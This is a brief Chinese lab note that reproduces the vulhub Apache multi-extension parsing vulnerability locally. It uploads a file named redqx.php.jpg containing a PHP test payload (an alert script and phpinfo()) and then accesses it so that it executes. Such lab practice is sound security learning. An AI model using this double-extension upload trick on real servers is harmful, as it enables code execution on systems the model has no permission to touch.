

```
cd vulhub-master/httpd/apache_parsing_vulnerability/
docker-compose up -d
```



访问

![image-20230810174741741](img/image-20230810174741741.png)

好像默认是80端口



选择上传一个文件 redqx.php.jpg

```php
<?php
       echo "<script>alert('hi redqx')</script>";
       phpinfo();
?>
```



上传成功

![image-20230810180429571](img/image-20230810180429571.png)

然后访问

![image-20230810180413420](img/image-20230810180413420.png)



然后关闭

```
docker-compose down
```

